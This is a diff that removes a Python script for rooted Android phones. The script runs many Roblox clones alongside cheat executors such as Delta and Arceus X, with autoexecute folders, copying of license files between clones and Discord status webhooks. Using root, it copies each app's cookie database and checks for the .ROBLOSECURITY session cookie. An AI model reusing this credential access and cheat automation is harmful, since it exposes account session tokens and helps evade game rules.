@@ -1,3661 +1,1024 @@
-import os
-import time
-import json
-import subprocess
-import xml.etree.ElementTree as ET
-import sys
-import shutil
-import sqlite3
-from datetime import datetime
-from collections import deque
-
-# =========================
-# GLOBAL
-# =========================
-# Semua file config/data disimpan di folder yang sama dengan ova.py
-SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-CONFIG_FILE = os.path.join(SCRIPT_DIR, "config.json")
-PACKAGES_FILE = os.path.join(SCRIPT_DIR, "packages.json")
-PKG_SERVERS_FILE = os.path.join(SCRIPT_DIR, "pkg_servers.json")  # per-pkg server config: game_id atau private_link
-COOKIE_FILE = os.path.join(SCRIPT_DIR, "cookie.txt")
-COOKIE_MAP_FILE = os.path.join(SCRIPT_DIR, "cookie_map.json")  # mapping cookie index -> package
-monitor_active = False
-EXECUTOR_TYPE = "delta"  # Executor type: delta, delta_global, arceusx, or ronix
-
-# Delta Global folder paths (1 shared folder, like Arceus X)
-DELTA_GLOBAL_AUTOEXEC = "/storage/emulated/0/Delta/Autoexecute"
-DELTA_GLOBAL_WORKSPACE = "/storage/emulated/0/Delta/Workspace"
-
-# Account state tracking (seperti PC version)
-ACCOUNT_STATE = {}  # pkg -> {launch_time, json_start_time, json_active, last_status}
-
-# Log system - rolling 5 baris terakhir
-LOG_BUFFER = deque(maxlen=5)
-LAST_DISPLAY_STATUS = {}  # pkg -> status terakhir yang ditampilkan
-
-# =========================
-# BASIC UTILS
-# =========================
-def run_root_cmd(cmd):
-    try:
-        r = subprocess.run(
-            ["su", "-c", cmd],
-            capture_output=True,
-            text=True,
-            timeout=10
-        )
-        return r.stdout.strip() if r.returncode == 0 else ""
-    except subprocess.TimeoutExpired:
-        add_log("Command timeout")
-        return ""
-    except FileNotFoundError:
-        add_log("ERROR: su not found")
-        return ""
-    except Exception as e:
-        add_log(f"Command error: {e}")
-        return ""
-
-# =========================
-# CPU & RAM MONITORING
-# =========================
-def get_cpu_count():
-    try:
-        cpu_count = os.cpu_count()
-        if cpu_count:
-            return cpu_count
-        
-        with open('/proc/cpuinfo', 'r') as f:
-            cpu_count = len([line for line in f if line.startswith('processor')])
-            if cpu_count > 0:
-                return cpu_count
-        
-        return 4
-    except:
-        return 4
-
-
-def get_ram_info():
-    try:
-        with open('/proc/meminfo', 'r') as f:
-            lines = f.readlines()
-        
-        mem_total_kb = 0
-        mem_free_kb = 0
-        buffers_kb = 0
-        cached_kb = 0
-        
-        for line in lines:
-            if line.startswith('MemTotal:'):
-                mem_total_kb = int(line.split()[1])
-            elif line.startswith('MemFree:'):
-                mem_free_kb = int(line.split()[1])
-            elif line.startswith('Buffers:'):
-                buffers_kb = int(line.split()[1])
-            elif line.startswith('Cached:'):
-                cached_kb = int(line.split()[1])
-        
-        mem_used_kb = mem_total_kb - mem_free_kb - buffers_kb - cached_kb
-        
-        total_mb = mem_total_kb / 1024
-        used_mb = mem_used_kb / 1024
-        
-        percent = (used_mb / total_mb) * 100 if total_mb > 0 else 0
-        
-        return {
-            "total_mb": round(total_mb,2),
-            "used_mb": round(used_mb,2),
-            "percent": round(percent,1)
-        }
-    except:
-        return None
-
-
-def get_package_cpu_usage(package_name):
-    try:
-        pid_str = run_root_cmd(f"pidof {package_name}")
-        if not pid_str:
-            return 0.0
-        
-        pids = pid_str.split()
-        total_cpu = 0.0
-        
-        for pid in pids:
-            stat1 = run_root_cmd(f"cat /proc/{pid}/stat 2>/dev/null")
-            uptime1 = run_root_cmd("cat /proc/uptime 2>/dev/null")
-            if not stat1 or not uptime1:
-                continue
-            
-            parts1 = stat1.split()
-            utime1 = int(parts1[13])
-            stime1 = int(parts1[14])
-            uptime_sec1 = float(uptime1.split()[0])
-            
-            time.sleep(0.2)
-            
-            stat2 = run_root_cmd(f"cat /proc/{pid}/stat 2>/dev/null")
-            uptime2 = run_root_cmd("cat /proc/uptime 2>/dev/null")
-            if not stat2 or not uptime2:
-                continue
-            
-            parts2 = stat2.split()
-            utime2 = int(parts2[13])
-            stime2 = int(parts2[14])
-            uptime_sec2 = float(uptime2.split()[0])
-            
-            proc_time = ((utime2+stime2)-(utime1+stime1)) / 100.0
-            elapsed = uptime_sec2 - uptime_sec1
-            
-            if elapsed > 0:
-                cpu = (proc_time / elapsed) * 100.0
-                cpu /= get_cpu_count()
-                total_cpu += min(cpu,100)
-        
-        return round(min(total_cpu,100),1)
-    except:
-        return 0.0
-
-
-def get_package_ram_usage(package_name):
-    try:
-        pid_str = run_root_cmd(f"pidof {package_name}")
-        if not pid_str:
-            return None
-        
-        total_rss_kb = 0
-        for pid in pid_str.split():
-            status_content = run_root_cmd(f"cat /proc/{pid}/status 2>/dev/null")
-            if not status_content:
-                continue
-            
-            for line in status_content.splitlines():
-                if line.startswith("VmRSS:"):
-                    total_rss_kb += int(line.split()[1])
-                    break
-        
-        if total_rss_kb == 0:
-            return None
-        
-        rss_mb = total_rss_kb / 1024.0
-        
-        ram_info = get_ram_info()
-        percent = (rss_mb / ram_info["total_mb"] * 100) if ram_info else 0
-        
-        return {
-            "used_mb": round(rss_mb,2),
-            "percent": round(percent,2)
-        }
-    except:
-        return None
-
-
-def get_all_packages_stats(pkgs):
-    stats = {}
-    
-    for pkg, info in pkgs.items():
-        cpu = get_package_cpu_usage(pkg)
-        ram = get_package_ram_usage(pkg)
-        
-        stats[pkg] = {
-            "username": info["username"],
-            "cpu": cpu,
-            "ram_mb": ram["used_mb"] if ram else 0,
-            "ram_percent": ram["percent"] if ram else 0
-        }
-    
-    return stats
-
-
-# =========================
-# DISCORD WEBHOOK
-# =========================
-def send_discord_webhook(webhook_url, title, message, color=None):
-    """Kirim pesan ke Discord webhook - IMPROVED VERSION"""
-    if not webhook_url or webhook_url == "":
-        return False
-    
-    try:
-        color = color or 16711680  # Red default
-        
-        # Build JSON payload dengan escaping yang benar
-        payload = {
-            "embeds": [{
-                "title": str(title),
-                "description": str(message),
-                "color": int(color),
-                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
-            }]
-        }
-        
-        # Convert ke JSON string
-        payload_str = json.dumps(payload)
-        
-        # Escape single quotes untuk shell command
-        payload_escaped = payload_str.replace("'", "'\"'\"'")
-        
-        # Build curl command
-        cmd = f"curl -s -X POST -H 'Content-Type: application/json' -d '{payload_escaped}' '{webhook_url}'"
-        
-        # Execute command
-        result = os.system(cmd)
-        
-        return result == 0
-    except Exception as e:
-        log(f"Webhook error: {e}")
-        return False
-
-
-def build_webhook_status_message(pkgs, cfg):
-    lines = []
-    ingame_count = 0
-    total_count = len(pkgs)
-
-    for pkg, info in pkgs.items():
-        username = info["username"]
-        try:
-            status = determine_account_status(pkg, info, cfg)
-        except Exception:
-            status = "unknown"
-
-        if status == "in_game":
-            emoji = "🟢"
-            label = "In Game"
-            ingame_count += 1
-        elif status == "waiting":
-            emoji = "🟡"
-            label = "Waiting"
-        elif status == "needs_kill":
-            emoji = "🔴"
-            label = "Needs Kill"
-        elif status == "offline":
-            emoji = "⚫"
-            label = "Offline"
-        else:
-            emoji = "❓"
-            label = status.upper()
-
-        lines.append(f"{emoji} **{username}** — {label}")
-
-    lines.insert(0, f"📦 **{ingame_count}/{total_count} In Game**\n")
-    return "\n".join(lines)
-
-
-def clear_screen():
-    """Clear screen dengan ANSI escape code"""
-    print("\033[2J\033[H", end='')
-    sys.stdout.flush()
-
-def add_log(msg):
-    """Tambah log ke buffer (max 5 baris)"""
-    timestamp = time.strftime('%H:%M:%S')
-    LOG_BUFFER.append(f"[{timestamp}] {msg}")
-
-# =========================
-# CONFIG
-# =========================
-def load_config():
-    global EXECUTOR_TYPE
-    
-    default = {
-        "game_id": "",
-        "check_interval": 10,
-        "first_check": 3,  # Grace period dalam menit (seperti PC version)
-        "ingame_check": 2,
-        "workspace_check_interval": 5,
-        "json_suffix": "_checkyum.json",
-        "startup_delay": 8,
-        "restart_delay": 3,
-        "autoexec_enabled": True,
-        "webhook_url": "",
-        "webhook_enabled": True,
-        "webhook_interval": 10,
-        "restart_interval": 0,
-        "executor": "delta",  # delta, delta_global, arceusx, or ronix
-        "freeform_enabled": False,
-        "windows_per_row": 2,
-        "use_fixed_size": False,
-        "window_width": 540,
-        "window_height": 960,
-        "arrange_interval": 30,
-        "gap_h": 35,
-        "gap_v": 35
-    }
-    if os.path.exists(CONFIG_FILE):
-        try:
-            with open(CONFIG_FILE) as f:
-                loaded = json.load(f)
-                default.update(loaded)
-        except Exception as e:
-            add_log(f"Config load error: {e}")
-    
-    # Set global executor type
-    EXECUTOR_TYPE = default.get("executor", "delta")
-    
-    return default
-
-def save_config(cfg):
-    try:
-        with open(CONFIG_FILE, "w") as f:
-            json.dump(cfg, f, indent=2)
-        add_log("Config saved")
-    except Exception as e:
-        add_log(f"Config save error: {e}")
-
-
-# =========================
-# PACKAGE DETECTION
-# =========================
-def get_roblox_packages():
-    out = run_root_cmd("pm list packages | grep com.roblox")
-    pkgs = []
-    for line in out.splitlines():
-        if line.startswith("package:"):
-            pkgs.append(line.split(":")[1])
-    return pkgs
-
-def get_username_from_prefs(package):
-    """Coba dapatkan username dari berbagai sumber"""
-    # Method 1: prefs.xml (cara lama)
-    prefs = f"/data/data/{package}/shared_prefs/prefs.xml"
-    xml = run_root_cmd(f"cat {prefs}")
-    if xml:
-        try:
-            root = ET.fromstring(xml)
-            for c in root:
-                if c.tag == "string" and c.attrib.get("name") == "username":
-                    if c.text and c.text.strip():
-                        return c.text.strip()
-        except Exception as e:
-            add_log(f"Prefs parse error {package}: {e}")
-
-    # Method 2: Cek cookie DB untuk username via .RBXIDCHECK
-    cookie_db = f"/data/data/{package}/app_webview/Default/Cookies"
-    tmp_db = f"/data/local/tmp/check_user_{package.split('.')[-1]}.db"
-    check = run_root_cmd(f"ls {cookie_db}")
-    if check:
-        try:
-            run_root_cmd(f"cp {cookie_db} {tmp_db}")
-            run_root_cmd(f"chmod 666 {tmp_db}")
-            conn = sqlite3.connect(tmp_db)
-            c = conn.cursor()
-            # Cek apakah ada .ROBLOSECURITY cookie (artinya pernah login)
-            c.execute("SELECT length(value) FROM cookies WHERE name='.ROBLOSECURITY' AND host_key='.roblox.com'")
-            row = c.fetchone()
-            conn.close()
-            run_root_cmd(f"rm {tmp_db}")
-            if row and row[0] > 0:
-                # Ada cookie, pakai nama package sebagai identifier
-                pkg_suffix = package.split('.')[-1]
-                return f"account_{pkg_suffix}"
-        except Exception:
-            run_root_cmd(f"rm {tmp_db}")
-
-    # Method 3: Cek apakah app pernah dijalankan (ada data)
-    has_data = run_root_cmd(f"ls /data/data/{package}/app_webview/")
-    if has_data:
-        pkg_suffix = package.split('.')[-1]
-        return f"pkg_{pkg_suffix}"
-
-    return None
-
-def auto_detect_and_save_packages():
-    global EXECUTOR_TYPE
-    
-    clear_screen()
-    print("AUTO DETECT ROBLOX PACKAGES\n")
-    pkgs = get_roblox_packages()
-    saved = {}
-
-    for pkg in pkgs:
-        print(f"Checking {pkg}...", end=" ")
-        user = get_username_from_prefs(pkg)
-
-        # Kalau username tidak ditemukan, tetap simpan dengan nama dari package
-        if not user:
-            pkg_suffix = pkg.split('.')[-1]
-            user = f"pkg_{pkg_suffix}"
-
-        # ArceusX menggunakan global workspace/autoexec
-        if EXECUTOR_TYPE == "arceusx":
-            package_info = {
-                "username": user,
-                "package_name": pkg,
-                "workspace_dir": "/storage/emulated/0/Arceus X/Workspace",
-                "autoexec_dir": "/storage/emulated/0/Arceus X/Autoexecute",
-                "cache_dir": None,
-                "license_path": None
-            }
-        elif EXECUTOR_TYPE == "ronix":
-            package_info = {
-                "username": user,
-                "package_name": pkg,
-                "workspace_dir": "/storage/emulated/0/RonixExploit/workspace",
-                "autoexec_dir": "/storage/emulated/0/RonixExploit/autoexecute",
-                "cache_dir": None,
-                "license_path": None
-            }
-        elif EXECUTOR_TYPE == "delta_global":
-            package_info = {
-                "username": user,
-                "package_name": pkg,
-                "workspace_dir": DELTA_GLOBAL_WORKSPACE,
-                "autoexec_dir": DELTA_GLOBAL_AUTOEXEC,
-                "cache_dir": None,
-                "license_path": None
-            }
-        else:
-            # Delta Executor (default)
-            package_info = {
-                "username": user,
-                "package_name": pkg,
-                "workspace_dir": f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Workspace",
-                "autoexec_dir": f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Autoexecute",
-                "cache_dir": f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Internals/Cache",
-                "license_path": f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Internals/Cache"
-            }
-        saved[pkg] = package_info
-        print(f"{user} ✓")
-
-    if saved:
-        with open(PACKAGES_FILE, "w") as f:
-            json.dump(saved, f, indent=2)
-        print(f"\nSaved {len(saved)} packages")
-    else:
-        print("\nNo valid packages")
-
-    input("\nEnter...")
-
-def auto_setup_wizard():
-    """Auto setup wizard - detect packages, set game id, choose executor"""
-    global EXECUTOR_TYPE
-    
-    clear_screen()
-    print("=" * 70)
-    print("🚀 AUTO SETUP WIZARD")
-    print("=" * 70)
-    print()
-    
-    # Step 1: Auto detect packages
-    print("📋 Step 1/3: Auto Detecting Packages...")
-    print("-" * 70)
-    
-    pkgs_found = get_roblox_packages()
-    detected = {}
-    
-    for pkg in pkgs_found:
-        user = get_username_from_prefs(pkg)
-        if not user:
-            pkg_suffix = pkg.split('.')[-1]
-            user = f"pkg_{pkg_suffix}"
-        detected[pkg] = {"username": user}
-    
-    if not detected:
-        print("\n❌ No Roblox packages found!")
-        input("\nPress ENTER to continue...")
-        return
-    
-    print(f"\n✅ Found {len(detected)} package(s):")
-    for i, (pkg, info) in enumerate(detected.items(), 1):
-        print(f"  {i}. {info['username']} ({pkg})")
-    
-    time.sleep(2)
-    
-    # Step 2: Set Game ID
-    print("\n" + "=" * 70)
-    print("🎮 Step 2/3: Set Game ID")
-    print("-" * 70)
-    
-    cfg = load_config()
-    current_id = cfg.get("game_id", "")
-    
-    if current_id:
-        print(f"Current Game ID: {current_id}")
-        use_current = input("Use current Game ID? (y/n): ").strip().lower()
-        if use_current == "y":
-            game_id = current_id
-        else:
-            game_id = input("Enter new Game ID: ").strip()
-    else:
-        game_id = input("Enter Game ID: ").strip()
-    
-    if game_id:
-        cfg["game_id"] = game_id
-        print(f"✅ Game ID set to: {game_id}")
-    
-    time.sleep(1)
-    
-    # Step 3: Choose Executor
-    print("\n" + "=" * 70)
-    print("⚡ Step 3/3: Choose Executor")
-    print("-" * 70)
-    print("1. Delta Executor - Per Package (default)")
-    print("2. Delta Executor - Global Folder (1 folder shared, like Arceus X)")
-    print("3. Arceus X")
-    print("4. RonixExploit")
-    print()
-    
-    executor_choice = input("Select executor (1/2/3/4, default=1): ").strip()
-    
-    if executor_choice == "2":
-        cfg["executor"] = "delta_global"
-        EXECUTOR_TYPE = "delta_global"
-        print("✅ Executor set to: Delta (Global Folder)")
-        print()
-        print("ℹ️  Delta Global Notes:")
-        print(f"   - All accounts share 1 folder")
-        print(f"   - Autoexec: {DELTA_GLOBAL_AUTOEXEC}")
-        print(f"   - Workspace: {DELTA_GLOBAL_WORKSPACE}")
-        print("   - Cache copy feature disabled")
-    elif executor_choice == "3":
-        cfg["executor"] = "arceusx"
-        EXECUTOR_TYPE = "arceusx"
-        print("✅ Executor set to: Arceus X")
-        print()
-        print("ℹ️  ArceusX Notes:")
-        print("   - All accounts use shared workspace")
-        print("   - Autoexec: /storage/emulated/0/Arceus X/Autoexecute")
-        print("   - Workspace: /storage/emulated/0/Arceus X/Workspace")
-        print("   - Cache copy feature disabled")
-    elif executor_choice == "4":
-        cfg["executor"] = "ronix"
-        EXECUTOR_TYPE = "ronix"
-        print("✅ Executor set to: RonixExploit")
-        print()
-        print("ℹ️  RonixExploit Notes:")
-        print("   - All accounts use shared workspace")
-        print("   - Autoexec: /storage/emulated/0/RonixExploit/autoexecute")
-        print("   - Workspace: /storage/emulated/0/RonixExploit/workspace")
-        print("   - Cache copy feature disabled")
-    else:
-        cfg["executor"] = "delta"
-        EXECUTOR_TYPE = "delta"
-        print("✅ Executor set to: Delta (Per Package)")
-    
-    save_config(cfg)
-    
-    # Now save packages with proper paths
-    saved = {}
-    for pkg, info in detected.items():
-        user = info["username"]
-        
-        if EXECUTOR_TYPE == "arceusx":
-            package_info = {
-                "username": user,
-                "package_name": pkg,
-                "workspace_dir": "/storage/emulated/0/Arceus X/Workspace",
-                "autoexec_dir": "/storage/emulated/0/Arceus X/Autoexecute",
-                "cache_dir": None,
-                "license_path": None
-            }
-        elif EXECUTOR_TYPE == "ronix":
-            package_info = {
-                "username": user,
-                "package_name": pkg,
-                "workspace_dir": "/storage/emulated/0/RonixExploit/workspace",
-                "autoexec_dir": "/storage/emulated/0/RonixExploit/autoexecute",
-                "cache_dir": None,
-                "license_path": None
-            }
-        elif EXECUTOR_TYPE == "delta_global":
-            package_info = {
-                "username": user,
-                "package_name": pkg,
-                "workspace_dir": DELTA_GLOBAL_WORKSPACE,
-                "autoexec_dir": DELTA_GLOBAL_AUTOEXEC,
-                "cache_dir": None,
-                "license_path": None
-            }
-        else:
-            package_info = {
-                "username": user,
-                "package_name": pkg,
-                "workspace_dir": f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Workspace",
-                "autoexec_dir": f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Autoexecute",
-                "cache_dir": f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Internals/Cache",
-                "license_path": f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Internals/Cache"
-            }
-        saved[pkg] = package_info
-    
-    with open(PACKAGES_FILE, "w") as f:
-        json.dump(saved, f, indent=2)
-    
-    # Summary
-    print("\n" + "=" * 70)
-    print("✅ AUTO SETUP COMPLETED!")
-    print("=" * 70)
-    print(f"📦 Packages: {len(saved)}")
-    print(f"🎮 Game ID: {game_id}")
-    print(f"⚡ Executor: {cfg['executor'].upper()}")
-    print("=" * 70)
-    
-    input("\nPress ENTER to return to main menu...")
-
-def load_packages():
-    if not os.path.exists(PACKAGES_FILE):
-        return {}
-    try:
-        with open(PACKAGES_FILE) as f:
-            return json.load(f)
-    except:
-        return {}
-
-# =========================
-# CACHE FOLDER MANAGEMENT
-# =========================
-def find_cache_dir(package_name):
-    """Cari folder Cache untuk package tertentu"""
-    possible_paths = [
-        f"/storage/emulated/0/Android/data/{package_name}/files/gloop/external/Internals/Cache",
-        f"/sdcard/Android/data/{package_name}/files/gloop/external/Internals/Cache",
-    ]
-    
-    for cache_dir in possible_paths:
-        if not os.path.isdir(cache_dir):
-            continue
-        
-        try:
-            files = os.listdir(cache_dir)
-            if files:
-                return cache_dir
-        except:
-            pass
-    
-    return None
-
-def copy_all_cache_files(source_cache_dir, dest_cache_dir, use_root=False):
-    """
-    Copy semua file dari folder Cache source ke destination
-    
-    Args:
-        source_cache_dir: Path folder Cache sumber
-        dest_cache_dir: Path folder Cache tujuan
-        use_root: Gunakan root command jika True
-    
-    Returns:
-        tuple: (success_count, failed_count, error_msg)
-    """
-    success = 0
-    failed = 0
-    error_msg = ""
-    
-    try:
-        # Pastikan source folder ada
-        if not os.path.isdir(source_cache_dir):
-            return 0, 0, f"Source folder tidak ditemukan: {source_cache_dir}"
-        
-        # Buat destination folder jika belum ada
-        if use_root:
-            run_root_cmd(f"mkdir -p '{dest_cache_dir}'")
-        else:
-            os.makedirs(dest_cache_dir, exist_ok=True)
-        
-        # List semua file di source
-        try:
-            source_files = os.listdir(source_cache_dir)
-        except PermissionError:
-            # Jika tidak bisa list dengan Python, coba dengan root
-            if use_root:
-                file_list = run_root_cmd(f"ls '{source_cache_dir}'")
-                source_files = file_list.split('\n') if file_list else []
-            else:
-                return 0, 0, "Permission denied - coba gunakan root mode"
-        
-        if not source_files:
-            return 0, 0, "Source folder kosong"
-        
-        # Copy setiap file
-        for filename in source_files:
-            if not filename.strip():
-                continue
-                
-            source_file = os.path.join(source_cache_dir, filename)
-            dest_file = os.path.join(dest_cache_dir, filename)
-            
-            try:
-                if use_root:
-                    result = run_root_cmd(f"cp '{source_file}' '{dest_file}'")
-                    if result == "":  # Empty string means success
-                        success += 1
-                    else:
-                        failed += 1
-                        error_msg += f"Failed to copy {filename}; "
-                else:
-                    shutil.copy2(source_file, dest_file)
-                    success += 1
-            except Exception as e:
-                failed += 1
-                error_msg += f"Error copying {filename}: {str(e)}; "
-        
-        return success, failed, error_msg
-    
-    except Exception as e:
-        return 0, 0, f"General error: {str(e)}"
-
-def copy_license_to_all_packages():
-    """Menu untuk copy cache files ke semua package - dengan pilihan file"""
-    global EXECUTOR_TYPE
-    
-    # Check executor type
-    if EXECUTOR_TYPE in ["arceusx", "ronix", "delta_global"]:
-        clear_screen()
-        print("=" * 70)
-        print("⚠️  CACHE COPY NOT AVAILABLE")
-        print("=" * 70)
-        if EXECUTOR_TYPE == "arceusx":
-            executor_name = "Arceus X"
-        elif EXECUTOR_TYPE == "ronix":
-            executor_name = "RonixExploit"
-        else:
-            executor_name = "Delta (Global Folder)"
-        print(f"\nCache copy feature is not available for {executor_name} executor.")
-        print(f"{executor_name} uses global autoexec and workspace directories.")
-        input("\nPress ENTER...")
-        return
-    
-    clear_screen()
-    print("=" * 70)
-    print("🗂️ COPY CACHE FILES TO ALL PACKAGES")
-    print("=" * 70)
-    
-    pkgs = load_packages()
-    if not pkgs:
-        add_log("No packages found")
-        input("\nPress ENTER...")
-        return
-    
-    # Cari source package yang punya cache
-    print("\n📋 Available packages with cache:")
-    available = []
-    for i, (pkg, info) in enumerate(pkgs.items(), 1):
-        cache_dir = find_cache_dir(pkg)
-        if cache_dir:
-            available.append((pkg, info, cache_dir))
-            print(f"  {i}. {info['username']} (Package: {pkg})")
-    
-    if not available:
-        add_log("❌ No packages with cache files found!")
-        input("\nPress ENTER...")
-        return
-    
-    # Pilih source
-    choice = input(f"\n📌 Select source package (1-{len(available)}) or Enter for first: ").strip()
-    
-    if choice == "":
-        source_pkg, source_info, source_cache_dir = available[0]
-    else:
-        try:
-            idx = int(choice) - 1
-            if 0 <= idx < len(available):
-                source_pkg, source_info, source_cache_dir = available[idx]
-            else:
-                add_log("Invalid choice")
-                input("\nPress ENTER...")
-                return
-        except ValueError:
-            add_log("Invalid input")
-            input("\nPress ENTER...")
-            return
-    
-    add_log(f"\n✅ Source: {source_info['username']} ({source_pkg})")
-    add_log(f"📂 Source cache: {source_cache_dir}")
-    
-    # Tampilkan file yang tersedia
-    try:
-        files = os.listdir(source_cache_dir)
-        if not files:
-            add_log("❌ No files found in cache!")
-            input("\nPress ENTER...")
-            return
-        
-        print("\n📋 Available files:")
-        for i, f in enumerate(sorted(files), 1):
-            print(f"  {i}. {f}")
-    except Exception as e:
-        add_log(f"Error listing files: {e}")
-        input("\nPress ENTER...")
-        return
-    
-    # Pilihan: semua atau spesifik
-    print("\n" + "-" * 70)
-    copy_mode = input("📌 Copy ALL files or SELECT specific? (all/select, default=all): ").strip().lower()
-    
-    files_to_copy = []
-    
-    if copy_mode == "select":
-        # Mode pilih file tertentu
-        print("\n💡 Enter file names to copy (one per line, press ENTER twice to finish):")
-        print("   Or enter numbers separated by comma (e.g., 1,3,5)")
-        
-        file_input = input("\n📌 Files: ").strip()
-        
-        if not file_input:
-            add_log("Cancelled")
-            input("\nPress ENTER...")
-            return
-        
-        # Cek apakah input berupa angka
-        if ',' in file_input or file_input.isdigit():
-            # Input berupa nomor
-            try:
-                if ',' in file_input:
-                    indices = [int(x.strip()) - 1 for x in file_input.split(',')]
-                else:
-                    indices = [int(file_input) - 1]
-                
-                sorted_files = sorted(files)
-                for idx in indices:
-                    if 0 <= idx < len(sorted_files):
-                        files_to_copy.append(sorted_files[idx])
-                
-                if not files_to_copy:
-                    add_log("No valid files selected")
-                    input("\nPress ENTER...")
-                    return
-            except ValueError:
-                add_log("Invalid input")
-                input("\nPress ENTER...")
-                return
-        else:
-            # Input berupa nama file
-            files_to_copy = [f.strip() for f in file_input.split(',')]
-            # Validasi file exists
-            files_to_copy = [f for f in files_to_copy if f in files]
-            
-            if not files_to_copy:
-                add_log("No valid files found")
-                input("\nPress ENTER...")
-                return
-    else:
-        # Copy semua file
-        files_to_copy = files
-    
-    # Tampilkan file yang akan di-copy
-    add_log(f"\n📄 Files to copy: {len(files_to_copy)}")
-    for f in files_to_copy[:5]:
-        add_log(f"  - {f}")
-    if len(files_to_copy) > 5:
-        add_log(f"  ... and {len(files_to_copy) - 5} more files")
-    
-    confirm = input("\n⚠️ Copy to ALL other packages? (y/n): ").strip().lower()
-    if confirm != 'y':
-        add_log("Cancelled")
-        input("\nPress ENTER...")
-        return
-    
-    # Tanya mode
-    mode = input("Use root mode? (y/n, default=n): ").strip().lower()
-    use_root = (mode == 'y')
-    
-    print("\n" + "=" * 70)
-    add_log("Starting copy process...")
-    print("=" * 70)
-    
-    total_success = 0
-    total_failed = 0
-    
-    for pkg, info in pkgs.items():
-        if pkg == source_pkg:
-            continue
-        
-        username = info['username']
-        dest_cache_dir = find_cache_dir(pkg)
-        
-        if not dest_cache_dir:
-            # Coba buat folder
-            dest_cache_dir = f"/storage/emulated/0/Android/data/{pkg}/files/gloop/external/Internals/Cache"
-            if use_root:
-                run_root_cmd(f"mkdir -p '{dest_cache_dir}'")
-            else:
-                try:
-                    os.makedirs(dest_cache_dir, exist_ok=True)
-                except:
-                    pass
-        
-        add_log(f"\n📦 Copying to: {username}")
-        
-        # Copy hanya file yang dipilih
-        success = 0
-        failed = 0
-        error_msg = ""
-        
-        for filename in files_to_copy:
-            src_file = os.path.join(source_cache_dir, filename)
-            dst_file = os.path.join(dest_cache_dir, filename)
-            
-            try:
-                if use_root:
-                    cmd = f"cp '{src_file}' '{dst_file}'"
-                    result = run_root_cmd(cmd)
-                    if run_root_cmd(f"test -f '{dst_file}' && echo 'ok'") == "ok":
-                        success += 1
-                    else:
-                        failed += 1
-                else:
-                    shutil.copy2(src_file, dst_file)
-                    success += 1
-            except Exception as e:
-                failed += 1
-                error_msg += f"{filename}: {str(e)}; "
-        
-        if success > 0:
-            add_log(f"  ✅ Success: {success} files")
-            total_success += success
-        if failed > 0:
-            add_log(f"  ❌ Failed: {failed} files")
-            total_failed += failed
-        if error_msg:
-            add_log(f"  ⚠️ Errors: {error_msg[:100]}")
-    
-    print("\n" + "=" * 70)
-    add_log(f"📊 RESULTS:")
-    add_log(f"  ✅ Total success: {total_success} files")
-    add_log(f"  ❌ Total failed: {total_failed} files")
-    print("=" * 70)
-    
-    input("\nPress ENTER...")
-
-def view_license_status():
-    """Lihat status cache untuk semua package"""
-    global EXECUTOR_TYPE
-    
-    clear_screen()
-    print("=" * 70)
-    print("📊 CACHE FOLDER STATUS")
-    print("=" * 70)
-    
-    # Check executor type
-    if EXECUTOR_TYPE in ["arceusx", "ronix", "delta_global"]:
-        if EXECUTOR_TYPE == "arceusx":
-            executor_name = "Arceus X"
-        elif EXECUTOR_TYPE == "ronix":
-            executor_name = "RonixExploit"
-        else:
-            executor_name = "Delta (Global Folder)"
-        print(f"\n⚠️  Cache feature not available for {executor_name} executor")
-        print(f"   {executor_name} uses global autoexec directory")
-        input("\nPress ENTER...")
-        return
-    
-    pkgs = load_packages()
-    if not pkgs:
-        add_log("No packages found")
-        input("\nPress ENTER...")
-        return
-    
-    print(f"\n{'No.':<4} {'Username':<20} {'Cache Status':<15} {'File Count':<12}")
-    print("-" * 70)
-    
-    for i, (pkg, info) in enumerate(pkgs.items(), 1):
-        username = info['username']
-        cache_dir = find_cache_dir(pkg)
-        
-        if cache_dir:
-            try:
-                files = os.listdir(cache_dir)
-                file_count = len(files)
-                status = "✅ Found"
-                count_str = str(file_count)
-            except:
-                status = "⚠️ Error"
-                count_str = "N/A"
-        else:
-            status = "❌ Not Found"
-            count_str = "0"
-        
-        print(f"{i:<4} {username:<20} {status:<15} {count_str:<12}")
-    
-    print("=" * 70)
-    input("\nPress ENTER...")
-
-# =========================
-# SCRIPT MANAGEMENT
-# =========================
-def list_executor_scripts(package_info):
-    """Mendapatkan daftar script untuk paket tertentu"""
-    global EXECUTOR_TYPE
-    autoexec_dir = package_info.get("autoexec_dir", "")
-    
-    if not autoexec_dir:
-        return []
-    
-    # Untuk ArceusX dan RonixExploit, gunakan root command
-    if EXECUTOR_TYPE in ["arceusx", "ronix"]:
-        cmd = f"ls {autoexec_dir}/*.lua {autoexec_dir}/*.txt 2>/dev/null"
-        result = run_root_cmd(cmd)
-        if not result:
-            return []
-        
-        scripts = []
-        for path in result.splitlines():
-            scripts.append(os.path.basename(path.strip()))
-        return sorted(scripts)
-    else:
-        # Delta (per-package) dan Delta Global: gunakan Python biasa
-        if not os.path.exists(autoexec_dir):
-            return []
-        
-        try:
-            return [
-                f for f in os.listdir(autoexec_dir)
-                if f.endswith((".lua", ".txt"))
-            ]
-        except:
-            return []
-
-def add_script_to_all_packages():
-    """Menambahkan script ke semua paket"""
-    global EXECUTOR_TYPE
-    
-    clear_screen()
-    print("=" * 70)
-    print("📝 ADD SCRIPT TO ALL PACKAGES")
-    print("=" * 70)
-    
-    pkgs = load_packages()
-    if not pkgs:
-        add_log("No packages found")
-        input("\nPress ENTER...")
-        return
-    
-    print(f"\nFound {len(pkgs)} packages:")
-    for i, (pkg, info) in enumerate(pkgs.items(), 1):
-        print(f"  {i}. {info['username']}")
-    
-    print("\n" + "-" * 70)
-    print("Paste script content (press ENTER twice to finish):")
-    
-    lines = []
-    empty_count = 0
-    
-    while True:
-        try:
-            line = input()
-        except (EOFError, KeyboardInterrupt):
-            print()
-            break
-        
-        if line == "":
-            empty_count += 1
-            if empty_count >= 2:
-                break
-        else:
-            empty_count = 0
-            lines.append(line)
-    
-    script_content = "\n".join(lines).strip()
-    
-    if not script_content:
-        add_log("Empty script, cancelled")
